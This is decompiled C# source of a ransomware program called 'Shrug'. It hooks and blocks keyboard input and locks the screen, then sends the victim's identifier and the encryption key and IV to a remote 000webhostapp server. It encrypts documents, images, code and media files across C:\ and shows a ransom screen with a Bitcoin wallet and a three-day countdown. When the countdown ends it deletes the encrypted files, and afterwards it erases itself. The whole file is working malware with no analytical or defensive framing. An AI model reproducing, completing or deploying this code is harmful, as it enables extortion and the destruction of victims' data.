using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Shrug;

public class ShrugForm : Form
{
	private struct KBDLLHOOKSTRUCT
	{
		public Keys key;

		public int scanCode;

		public int flags;

		public int time;

		public IntPtr extra;
	}

	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private PHTextBox txt_Wallet = new PHTextBox("Your wallet goes here");

	private string UNIQUE_IDENTIFIER = "";

	private const bool Debug = false;

	private DateTime installDate;

	private DateTime timeDelete;

	private Cryptor cryptor;

	private IntPtr ptrHook;

	private LowLevelKeyboardProc objKeyboardProcess;

	private IContainer components = null;

	private Label lbl_Title;

	private Button btn_ConfirmPayment;

	private Label lbl_Wallet;

	private RichTextBox rtb_Info;

	private Timer CheckPaymentTimer;

	private Timer DecreaseRemainingTime;

	private Label lbl_FileDestroy;

	private Timer SetFwindow;

	private bool ConnectedToTheInternet
	{
		get
		{
			try
			{
				using WebClient webClient = new WebClient();
				using (webClient.OpenRead("http://clients3.google.com/generate_204"))
				{
					return true;
				}
			}
			catch (Exception)
			{
				return false;
			}
		}
	}

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool fBlockIt);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SetForegroundWindow(IntPtr hWnd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool UnhookWindowsHookEx(IntPtr hook);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string name);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern short GetAsyncKeyState(Keys key);

	private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Invalid comparison between Unknown and I4
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Invalid comparison between Unknown and I4
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Invalid comparison between Unknown and I4
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Invalid comparison between Unknown and I4
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Invalid comparison between Unknown and I4
		if (nCode >= 0)
		{
			KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
			if ((int)kBDLLHOOKSTRUCT.key == 92 || (int)kBDLLHOOKSTRUCT.key == 91 || ((int)kBDLLHOOKSTRUCT.key == 9 && HasAltModifier(kBDLLHOOKSTRUCT.flags)) || ((int)kBDLLHOOKSTRUCT.key == 27 && (Control.get_ModifierKeys() & 0x20000) == 131072))
			{
				return (IntPtr)1;
			}
		}
		return CallNextHookEx(ptrHook, nCode, wp, lp);
	}

	private bool HasAltModifier(int flags)
	{
		return (flags & 0x20) == 32;
	}

	public ShrugForm()
	{
		InitializeComponent();
	}

	private void lbl_Wallet_Click(object sender, EventArgs e)
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		string text = "1Hr1grgH9ViEgUx73iRRJLVKH3PFjUteNx";
		Clipboard.SetText(text);
		MessageBox.Show("Wallet (" + text + ") copied to clipboard.");
	}

	private void btn_ConfirmPayment_Click(object sender, EventArgs e)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)txt_Wallet).get_Text() == "" || ((Control)txt_Wallet).get_Text() == "Your wallet goes here")
		{
			MessageBox.Show("Please type in your wallet first.");
			return;
		}
		string address = "http://tempacc11vl.000webhostapp.com/marthas_stuff/uploadoldhash.php";
		try
		{
			using WebClient webClient = new WebClient();
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection["partA"] = UNIQUE_IDENTIFIER;
			nameValueCollection["partB"] = ((Control)txt_Wallet).get_Text();
			byte[] bytes = webClient.UploadValues(address, nameValueCollection);
			Encoding.UTF8.GetString(bytes);
		}
		catch (Exception)
		{
		}
	}

	private void ShrugForm_Load(object sender, EventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		objKeyboardProcess = captureKey;
		ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(mainModule.ModuleName), 0u);
		try
		{
			BlockInput(fBlockIt: true);
		}
		catch (Exception)
		{
		}
		((Form)this).add_FormClosing(new FormClosingEventHandler(EventFormClosing));
		if (!RegistryInstalled())
		{
			while (!ConnectedToTheInternet && !ConnectedToTheInternet)
			{
			}
		}
		int width = Screen.get_PrimaryScreen().get_Bounds().Size.Width;
		int height = Screen.get_PrimaryScreen().get_Bounds().Size.Height;
		((Form)this).set_Size(new Size(width, height));
		((Form)this).set_Location(new Point(0, 0));
		((Control)txt_Wallet).set_Font(new Font("Calibri", 14f));
		((Control)txt_Wallet).set_Location(new Point(345, 442));
		((Control)txt_Wallet).set_Width(((Control)btn_ConfirmPayment).get_Width());
		((TextBox)txt_Wallet).set_TextAlign((HorizontalAlignment)2);
		((Control)this).get_Controls().Add((Control)(object)txt_Wallet);
		CenterControl((Control)(object)lbl_Title, (Form)(object)this);
		CenterControl((Control)(object)rtb_Info, (Form)(object)this);
		CenterControl((Control)(object)lbl_Wallet, (Form)(object)this);
		CenterControl((Control)(object)txt_Wallet, (Form)(object)this);
		CenterControl((Control)(object)btn_ConfirmPayment, (Form)(object)this);
		CenterControl((Control)(object)lbl_FileDestroy, (Form)(object)this);
		if (!RegistryInstalled())
		{
			installDate = DateTime.Now;
			UNIQUE_IDENTIFIER = Environment.UserName + "/" + Environment.MachineName;
			cryptor = new Cryptor();
			cryptor.GenerateKey();
			cryptor.GenerateIV();
			RegistryInstall();
			string address = "http://tempacc11vl.000webhostapp.com/marthas_stuff/uploadhash.php";
			try
			{
				using WebClient webClient = new WebClient();
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection["partA"] = UNIQUE_IDENTIFIER;
				nameValueCollection["partB"] = cryptor.Key;
				nameValueCollection["partC"] = cryptor.IV;
				byte[] bytes = webClient.UploadValues(address, nameValueCollection);
				Encoding.UTF8.GetString(bytes);
			}
			catch (Exception)
			{
			}
			EncryptFiles("C:\\");
		}
		else
		{
			cryptor = new Cryptor((string)GetRegInfo("key"), (string)GetRegInfo("iv"));
			installDate = DatetimeFromString((string)GetRegInfo("installdate"));
			UNIQUE_IDENTIFIER = (string)GetRegInfo("identifier");
		}
		timeDelete = installDate.AddDays(3.0);
		SetFwindow.Start();
		CheckPaymentTimer.Start();
		DecreaseRemainingTime.Start();
	}

	private void CheckPaymentTimer_Tick(object sender, EventArgs e)
	{
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		string address = "http://tempacc11vl.000webhostapp.com/marthas_stuff/freehashes.txt";
		try
		{
			using WebClient webClient = new WebClient();
			string text = webClient.DownloadString(address);
			if (text.Contains(UNIQUE_IDENTIFIER))
			{
				try
				{
					DecryptFiles("C:\\");
				}
				catch (Exception)
				{
				}
				try
				{
					RegistryUninstall();
				}
				catch (Exception)
				{
				}
				SetFwindow.Stop();
				MessageBox.Show("Yay! You paid $50 and your files were decrypted.");
				MessageBox.Show("Goodbye. See you around \ud83d\ude0a");
				SelfDestruction();
			}
		}
		catch (Exception)
		{
		}
	}

	private void DecreaseRemainingTime_Tick(object sender, EventArgs e)
	{
		//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0110: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Expected O, but got Unknown
		TimeSpan timeSpan = timeDelete.Subtract(DateTime.Now);
		((Control)lbl_FileDestroy).set_Text("Your files will be destroyed in\n");
		Label obj = lbl_FileDestroy;
		((Control)obj).set_Text(((Control)obj).get_Text() + string.Format($"{timeSpan.Days} days, {timeSpan.Hours} hours, {timeSpan.Minutes} minutes, {timeSpan.Seconds} seconds"));
		Label obj2 = lbl_FileDestroy;
		((Control)obj2).set_Text(((Control)obj2).get_Text() + "\nif you don't pay.");
		CenterControl((Control)(object)lbl_FileDestroy, (Form)(object)this);
		if (DateTime.Now > timeDelete)
		{
			try
			{
				DeleteFiles("C:\\");
				CheckPaymentTimer.Stop();
				DecreaseRemainingTime.Stop();
				MessageBox.Show("Time has expired. Your files are gone.");
				MessageBox.Show("See ya!");
				SelfDestruction();
				((Form)this).remove_FormClosing(new FormClosingEventHandler(EventFormClosing));
				((Form)this).Close();
			}
			catch (Exception)
			{
			}
		}
	}

	private void EventFormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private bool RegistryInstalled()
	{
		bool result = false;
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Shrug");
			if (registryKey.GetValue("installed") != null)
			{
				return true;
			}
			return result;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private void RegistryInstall()
	{
		try
		{
			Registry.CurrentUser.CreateSubKey("Shrug");
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Shrug", writable: true);
			registryKey.SetValue("installdate", DatetimeToString(DateTime.Now));
			registryKey.SetValue("identifier", UNIQUE_IDENTIFIER);
			registryKey.SetValue("installed", "true");
			registryKey.SetValue("key", cryptor.Key);
			registryKey.SetValue("iv", cryptor.IV);
		}
		catch (Exception)
		{
		}
	}

	private void RegistryUninstall()
	{
		try
		{
			Registry.CurrentUser.DeleteSubKey("Shrug");
		}
		catch (Exception)
		{
		}
	}

	private string DatetimeToString(DateTime dt)
	{
		string text = "";
		CultureInfo cultureInfo = new CultureInfo("en-US");
		return dt.ToString("dd/MM/yyyy HH:mm:ss", cultureInfo);
	}

	private DateTime DatetimeFromString(string dt)
	{
		DateTime now = DateTime.Now;
		CultureInfo provider = new CultureInfo("en-US");
		return DateTime.ParseExact(dt, "dd/MM/yyyy HH:mm:ss", provider);
	}

	private object GetRegInfo(string key)
	{
		object result = null;
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Shrug");
			result = registryKey.GetValue(key);
		}
		catch (Exception)
		{
		}
		return result;
	}

	private void EncryptFile(string file)
	{
		try
		{
			byte[] bytesToEncode = File.ReadAllBytes(file);
			byte[] bytes = cryptor.EncodeBytes(bytesToEncode);
			File.WriteAllBytes(file, bytes);
			File.Move(file, file + ".SHRUG");
		}
		catch (Exception)
		{
		}
	}

	private void EncryptFiles(string dir)
	{
		List<string> list = new List<string>
		{
			"txt", "docx", "xls", "doc", "xlsx", "ppt", "pptx", "odt", "jpg", "png",
			"jpeg", "csv", "psd", "sql", "mdb", "db", "sln", "html", "php", "asp",
			"aspx", "html", "xml", "json", "dat", "cpp", "cs", "py", "pyw", "c",
			"js", "java", "mp4", "ogg", "mp3", "wmv", "avi", "gif", "mpeg", ".msi"
		};
		string[] files = Directory.GetFiles(dir);
		string[] directories = Directory.GetDirectories(dir);
		string[] array = files;
		foreach (string text in array)
		{
			try
			{
				string extension = Path.GetExtension(text);
				if (list.Contains(extension.Replace(".", "")))
				{
					EncryptFile(text);
				}
			}
			catch (Exception)
			{
			}
		}
		string[] array2 = directories;
		foreach (string dir2 in array2)
		{
			try
			{
				EncryptFiles(dir2);
			}
			catch (Exception)
			{
			}
		}
	}

	private void DecryptFile(string path)
	{
		try
		{
			byte[] encryptedBytes = File.ReadAllBytes(path);
			byte[] bytes = cryptor.DecodeBytes(encryptedBytes);
			File.WriteAllBytes(path, bytes);
			string extension = Path.GetExtension(path);
			string destFileName = path.Substring(0, path.Length - extension.Length);
			File.Move(path, destFileName);
		}
		catch (Exception)
		{
		}
	}

	private void DecryptFiles(string dir)
	{
		string[] files = Directory.GetFiles(dir);
		string[] directories = Directory.GetDirectories(dir);
		string[] array = files;
		foreach (string path in array)
		{
			string extension = Path.GetExtension(path);
			if (extension == ".SHRUG")
			{
				try
				{
					DecryptFile(path);
				}
				catch (Exception)
				{
				}
			}
		}
		string[] array2 = directories;
		foreach (string dir2 in array2)
		{
			try
			{
				DecryptFiles(dir2);
			}
			catch (Exception)
			{
			}
		}
	}

	private void DeleteFile(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch (Exception)
		{
		}
	}

	private void DeleteFiles(string dir)
	{
		string[] files = Directory.GetFiles(dir);
		string[] directories = Directory.GetDirectories(dir);
		string[] array = files;
		foreach (string path in array)
		{
			string extension = Path.GetExtension(path);
			if (extension == ".SHRUG")
			{
				try
				{
					DeleteFile(path);
				}
				catch (Exception)
				{
				}
			}
		}
		string[] array2 = directories;
		foreach (string dir2 in array2)
		{
			try
			{
				DeleteFiles(dir2);
			}
			catch (Exception)
			{
			}
		}
	}

	private void SelfDestruction()
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Application.get_ExecutablePath();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		((Form)this).remove_FormClosing(new FormClosingEventHandler(EventFormClosing));
		((Form)this).Close();
	}

	private void CenterControl(Control ctrl, Form baseform, bool x = true, bool y = false)
	{
		int x2 = (x ? Convert.ToInt32(((Control)baseform).get_Width() / 2 - ctrl.get_Width() / 2) : ctrl.get_Location().X);
		int y2 = (y ? Convert.ToInt32(((Control)baseform).get_Height() / 2 - ctrl.get_Height() / 2) : ctrl.get_Location().Y);
		ctrl.set_Location(new Point(x2, y2));
	}

	private void ShrugForm_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Invalid comparison between Unknown and I4
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Invalid comparison between Unknown and I4
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Invalid comparison between Unknown and I4
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0072: Invalid comparison between Unknown and I4
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Invalid comparison between Unknown and I4
		//IL_009f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Invalid comparison between Unknown and I4
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Invalid comparison between Unknown and I4
		if (e.get_Control() && e.get_Alt() && (int)e.get_KeyCode() == 46)
		{
			e.set_SuppressKeyPress(true);
		}
		if (e.get_Shift() && (int)e.get_KeyCode() == 27)
		{
			e.set_SuppressKeyPress(true);
		}
		if (e.get_Control() && (int)e.get_KeyCode() == 87)
		{
			e.set_SuppressKeyPress(true);
		}
		if (e.get_Alt() && (int)e.get_KeyCode() == 9)
		{
			e.set_SuppressKeyPress(true);
		}
		if (e.get_Alt() && (int)e.get_KeyCode() == 115)
		{
			e.set_SuppressKeyPress(true);
		}
		if ((int)e.get_KeyCode() == 91 || (int)e.get_KeyCode() == 92)
		{
			e.set_SuppressKeyPress(true);
		}
	}

	private void SetFwindow_Tick(object sender, EventArgs e)
	{
		SetForegroundWindow(((Control)this).get_Handle());
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b4: Expected O, but got Unknown
		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0128: Expected O, but got Unknown
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Expected O, but got Unknown
		//IL_0252: Unknown result type (might be due to invalid IL or missing references)
		//IL_025c: Expected O, but got Unknown
		//IL_0337: Unknown result type (might be due to invalid IL or missing references)
		//IL_0341: Expected O, but got Unknown
		//IL_049e: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a8: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(ShrugForm));
		lbl_Title = new Label();
		btn_ConfirmPayment = new Button();
		lbl_Wallet = new Label();
		rtb_Info = new RichTextBox();
		CheckPaymentTimer = new Timer(components);
		DecreaseRemainingTime = new Timer(components);
		lbl_FileDestroy = new Label();
		SetFwindow = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)lbl_Title).set_AutoSize(true);
		((Control)lbl_Title).set_Font(new Font("Calibri", 21.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)lbl_Title).set_Location(new Point(372, 9));
		((Control)lbl_Title).set_Name("lbl_Title");
		((Control)lbl_Title).set_Size(new Size(320, 36));
		((Control)lbl_Title).set_TabIndex(0);
		((Control)lbl_Title).set_Text("Oh shit waddup \u00af\\_(ツ)_/\u00af");
		((Control)btn_ConfirmPayment).set_Font(new Font("Calibri", 16f));
		((Control)btn_ConfirmPayment).set_Location(new Point(345, 478));
		((Control)btn_ConfirmPayment).set_Name("btn_ConfirmPayment");
		((Control)btn_ConfirmPayment).set_Size(new Size(366, 40));
		((Control)btn_ConfirmPayment).set_TabIndex(5);
		((Control)btn_ConfirmPayment).set_Text("I paid! ™");
		((ButtonBase)btn_ConfirmPayment).set_UseVisualStyleBackColor(true);
		((Control)btn_ConfirmPayment).add_Click((EventHandler)btn_ConfirmPayment_Click);
		((Control)lbl_Wallet).set_AutoSize(true);
		((Control)lbl_Wallet).set_Font(new Font("Consolas", 10f));
		((Control)lbl_Wallet).set_Location(new Point(384, 377));
		((Control)lbl_Wallet).set_Name("lbl_Wallet");
		((Control)lbl_Wallet).set_Size(new Size(280, 34));
		((Control)lbl_Wallet).set_TabIndex(7);
		((Control)lbl_Wallet).set_Text("1Hr1grgH9ViEgUx73iRRJLVKH3PFjUteNx\r\n(click to copy to clipboard)");
		((Control)lbl_Wallet).add_Click((EventHandler)lbl_Wallet_Click);
		((Control)rtb_Info).set_Font(new Font("Calibri", 9f));
		((Control)rtb_Info).set_Location(new Point(345, 48));
		((Control)rtb_Info).set_Name("rtb_Info");
		((TextBoxBase)rtb_Info).set_ReadOnly(true);
		((Control)rtb_Info).set_Size(new Size(366, 234));
		((Control)rtb_Info).set_TabIndex(9);
		((Control)rtb_Info).set_Text(componentResourceManager.GetString("rtb_Info.Text"));
		CheckPaymentTimer.set_Interval(60000);
		CheckPaymentTimer.add_Tick((EventHandler)CheckPaymentTimer_Tick);
		DecreaseRemainingTime.set_Interval(1000);
		DecreaseRemainingTime.add_Tick((EventHandler)DecreaseRemainingTime_Tick);
		((Control)lbl_FileDestroy).set_AutoSize(true);
		((Control)lbl_FileDestroy).set_Font(new Font("Calibri", 16f, (FontStyle)1));
		((Control)lbl_FileDestroy).set_ForeColor(Color.DarkRed);
		((Control)lbl_FileDestroy).set_Location(new Point(275, 285));
		((Control)lbl_FileDestroy).set_Name("lbl_FileDestroy");
		((Control)lbl_FileDestroy).set_Size(new Size(497, 27));
		((Control)lbl_FileDestroy).set_TabIndex(10);
		((Control)lbl_FileDestroy).set_Text("Your files will be destroyed in 3 days if you don't pay!");
		SetFwindow.set_Interval(50);
		SetFwindow.add_Tick((EventHandler)SetFwindow_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(1049, 530));
		((Control)this).get_Controls().Add((Control)(object)lbl_FileDestroy);
		((Control)this).get_Controls().Add((Control)(object)rtb_Info);
		((Control)this).get_Controls().Add((Control)(object)lbl_Wallet);
		((Control)this).get_Controls().Add((Control)(object)btn_ConfirmPayment);
		((Control)this).get_Controls().Add((Control)(object)lbl_Title);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("ShrugForm");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Shrug");
		((Form)this).add_Load((EventHandler)ShrugForm_Load);
		((Control)this).add_KeyDown(new KeyEventHandler(ShrugForm_KeyDown));
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
